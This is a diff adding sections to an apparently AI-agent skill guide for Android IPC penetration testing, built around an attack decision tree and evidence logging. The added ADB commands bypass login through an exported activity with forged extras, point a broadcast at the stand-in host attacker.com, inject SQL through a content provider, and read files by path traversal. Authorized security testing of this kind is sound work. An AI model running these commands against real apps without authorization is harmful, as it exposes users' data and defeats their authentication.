@@ -20,6 +20,43 @@ Use this skill when:
 
 **Do not use** on production devices without explicit authorization.
 
+
+## 1. Operational Decision Tree
+
+```text
+                 [Android Package Decompiled & Analyzed]
+                                    │
+                                    ▼
+                   [Inspect AndroidManifest.xml IPC]
+             Check targetSdkVersion (API 31+ vs legacy)
+             Identify android:exported="true" components
+                                    │
+             ┌──────────────────────┼──────────────────────┐
+             ▼                      ▼                      ▼
+    [Exported Activities]   [Broadcast Receivers]  [Content Providers]
+             │                      │                      │
+             ▼                      ▼                      ▼
+    [Intent Redirection]   [Broadcast Sniffing]   [Query & Path Injection]
+    - Deep link fuzzing    - Extract auth tokens  - content query URI
+    - Auth bypass flows    - Inject fake alerts   - SQLi in projection
+    - am start invocation  - am broadcast         - Traversal in openFile
+             │                      │                      │
+             └──────────────────────┼──────────────────────┘
+                                    │
+                                    ▼
+                   [PendingIntent Mutability Audit]
+               Check FLAG_MUTABLE without FLAG_IMMUTABLE
+               Hijack target action & component destination
+                                    │
+                                    ▼
+                   [Tripartite Verification Oracle]
+               Positive UI/Data + Negative Control + Diff
+                                    │
+                                    ▼
+                   [Evidence Ledger Registration]
+            arsenal append-evidence --case $CASE_ID --tool adb ...
+```
+
 ## Most Often Missed & How to Confirm
 
 - **`exported` default by SDK level** — a component with no `android:exported` is exported below API 31, private at 31+. Confirm the effective state against `targetSdkVersion`, not the manifest alone.
@@ -152,6 +189,75 @@ run app.service.start --action com.target.app.SYNC_SERVICE \
 run app.service.send com.target.app com.target.app.MessengerService \
   --msg 1 0 0 --extra string command "dump_database" --bundle-as-obj
 ```
+
+### Step 7: Native ADB Direct Command Execution Matrix
+
+When Drozer is unavailable, execute tests directly using Android Debug Bridge (ADB):
+
+```bash
+# 1. Directly launch exported activity bypassing login screens
+adb shell am start -n com.target.app/.ui.AdminDashboardActivity \
+  --es "user_role" "admin" \
+  --ez "is_authenticated" true
+
+# 2. Trigger exported broadcast receiver with crafted extras
+adb shell am broadcast -a com.target.app.ACTION_SYNC \
+  --es "sync_url" "https://attacker.com/sink" \
+  --ei "priority" 10
+
+# 3. Query unauthenticated Content Provider data
+adb shell content query --uri content://com.target.app.provider/users
+
+# 4. Test Content Provider SQL Injection
+adb shell content query --uri content://com.target.app.provider/notes \
+  --projection "* FROM users;--"
+
+# 5. Test Content Provider Path Traversal (Arbitrary File Read)
+adb shell content read --uri content://com.target.app.fileprovider/root/etc/hosts
+```
+
+---
+
+## 2. Tripartite Verification Oracle
+
+```text
++---------------------------------------------------------------------------------------+
+|                              TRIPARTITE VERIFICATION ORACLE                            |
++---------------------------------------------------------------------------------------+
+| 1. POSITIVE ASSERTION       | - Activity: Sensitive screen renders directly on device |
+|                             |   without requiring prior login or authentication steps.|
+|                             | - Receiver: Process executes payload action or logs     |
+|                             |   attributable state modification.                      |
+|                             | - Provider: Structured database records or file content |
+|                             |   returned to calling shell without SecurityException.  |
++-----------------------------+---------------------------------------------------------+
+| 2. NEGATIVE BASELINE        | Attempt identical invocation on non-exported component: |
+|    CONTROL                  | adb shell am start -n com.target.app/.PrivateActivity   |
+|                             | Verify Android OS throws java.lang.SecurityException:   |
+|                             | "Permission Denial: not exported from uid ...".         |
++-----------------------------+---------------------------------------------------------+
+| 3. DIFFERENTIAL INVARIANCE  | Verify invocation succeeds across non-root guest profile|
+|                             | and third-party unprivileged application sandbox context|
+|                             | confirming universal device exploitability.             |
++---------------------------------------------------------------------------------------+
+```
+
+---
+
+## 3. Evidence Capture & Ledger Registration
+
+```bash
+# 1. Capture extracted database records from content provider
+adb shell content query --uri content://com.target.app.provider/users > work/$CASE_ID/evidence/raw/provider_leak.txt
+
+# 2. Append evidence entry to cryptographic audit ledger
+arsenal append-evidence \
+  --case $CASE_ID \
+  --tool adb \
+  --file work/$CASE_ID/evidence/raw/provider_leak.txt \
+  --desc "Confirmed unauthenticated Android Content Provider data exposure via IPC"
+```
+
 
 ## Key Concepts
 
